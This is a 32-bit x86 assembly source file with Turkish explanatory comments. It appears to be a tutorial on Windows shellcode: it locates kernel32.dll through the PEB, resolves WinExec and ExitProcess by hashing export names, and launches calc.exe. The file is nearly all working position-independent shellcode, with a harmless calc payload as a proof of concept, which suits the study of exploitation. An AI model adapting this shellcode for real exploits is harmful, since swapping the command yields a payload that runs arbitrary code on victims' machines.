[BITS 32]

kernel32_bul:
xor ecx, ecx
mov esi, [fs:0x30] ; PEB adresi
mov esi, [esi + 0x0c] ; PEB LOADER DATA adresi
mov esi, [esi + 0x1c] ; Başlatılma sırasına göre modül listesinin başlangıç adresi

bir_sonraki_modul:
mov ebx, [esi + 0x08] ; Modülün baz adresi
mov edi, [esi + 0x20] ; Modül adı(unicode formatında)
mov esi, [esi] ; esi = Modül listesinde bir sonraki modül meta datalarının bulunduğu adres InInitOrder[X].flink(sonraki modul)
cmp [edi + 12*2], cl ; KERNEL32.DLL 12 karakterden oluştuğu için 24. byte ın null olup olmadığını kontrol ediyoruz.Bu yöntem olabilecek en güvenli ve jenerik yöntem değil, ancak işimizi görüyor.
jne bir_sonraki_modul ; Eğer 24. byte null değilse kernel32.dll ismini bulamamışız demektir

push ebx ;Kernel32nin adresini stacke yaz
push 0x10121ee3 ;WinExec fonksiyon adının hashi
call fonksiyon_bul ;eax ile WinExec fonksiyonunun adresini döndürür
add esp, 4
pop ebx ; Kernel32nin adresini tekrar ebx e yükle
push 0 ;calc metninin sonuna null karakter yerleştirmek için stacke 0x00000000 yazıyoruz
push 0x636C6163 ;calc metnini little endian formata uydurmak için tersten yazıyoruz
mov ecx, esp ; calc metninin adresini ecx e yükle
push 0 ; WinExec birinci parametre
push ecx ; WinExec ikinci parametre
call eax ; WinExec fonksiyonu çağrılır
push ebx ; Kernel32nin adresini stacke yaz
push 0x3c3f99f8 ;ExitProcess fonksiyon adının hashi
call fonksiyon_bul ;eax ile WinExec fonksiyonunun adresini döndürür
push 0
call eax ;ExitProcess fonksiyonu çağrılır

; Fonksiyon: Fonksiyon hashlerini karşılaştırarak fonksiyon adresini bulmak için.
; esp+8 de modül adresini, esp+4 te fonksiyon hashini alır
; Fonksiyon adresini eax ile döndürür
fonksiyon_bul:
mov ebp, [esp + 0x08] ;Modül adresini al
mov eax, [ebp + 0x3c] ;MSDOS başlığını atlıyoruz
mov edx, [ebp + eax + 0x78] ;Export tablosunun RVA adresini edx e yazıyoruz
add edx, ebp ;Export tablosunun VA adresini hesaplıyoruz
mov ecx, [edx + 0x18] ;Export tablosundan toplam fonksiyon sayısını sayaç olarak kullanmak üzere kaydediyoruz
mov ebx, [edx + 0x20] ;Export names tablosunun RVA adresini ebx e yazıyoruz
add ebx, ebp ;Export names tablosunun VA adresini hesaplıyoruz

fonksiyon_bulma_dongusu:
dec ecx ;Sayaç son fonksiyondan başlayarak başa doğru azaltılır
mov esi, [ebx + ecx * 4] ;Export names tablosunda sırası gelen fonksiyon adının pointerının VA adresini hesaplıyoruz ve pointer ı ESI a atıyoruz (pointer RVA formatında)
add esi, ebp ;Fonksiyon pointerının VA adresini hesaplıyoruz

hash_hesapla:
xor edi, edi
xor eax, eax
cld ;lods instructionı ESI register ını yanlışlıkla aşağı yönde değiştirmesin diye emin olmak için kullanıyoruz

hash_hesaplama_dongusu:
lodsb ;ESI nin işaret ettiği mevcut fonksiyon adı harfini (yani bir byteı) AL registerına yüklüyoruz ve ESI yi bir artırıyoruz
test al, al ;Fonksiyon adının sonuna gelip gelmediğimizi test ediyoruz
jz hash_hesaplandi ;AL register değeri 0 ise, yani fonksiyon adını tamamlamışsak hesaplamayı sona erdiriyoruz
ror edi, 0xf ;Hash değerini 15 bit sağa rotate ettiriyoruz
add edi, eax ;Hash değerine mevcut karakteri ekliyoruz
jmp hash_hesaplama_dongusu

hash_hesaplandi:

hash_karsilastirma:
cmp edi, [esp + 0x04] ;Hesaplanan hash değerinin stackte parametre olarak verilen fonksiyon hash değeri ile tutup tutmadığını kontrol ediyoruz
jnz fonksiyon_bulma_dongusu
mov ebx, [edx + 0x24] ;Fonksiyonun adresini bulabilmek için Export ordinals tablosunun RVA adresini tespit ediyoruz
add ebx, ebp ;Export ordinals tablosunun VA adresini hesaplıyoruz
mov cx, [ebx + 2 * ecx] ;Fonksiyonun Ordinal numarasını elde ediyoruz (ordinal numarası 2 byte)
mov ebx, [edx + 0x1c] ;Export adres tablosunun RVA adresini tespit ediyoruz
add ebx, ebp ;Export adres tablosunun VA adresini hesaplıyoruz
mov eax, [ebx + 4 * ecx] ;Fonksiyonun ordinal numarasını kullanarak fonksiyon adresinin RVA adresini tespit ediyoruz
add eax, ebp ;Fonksiyonun VA adresini hesaplıyoruz

fonksiyon_bulundu:
ret
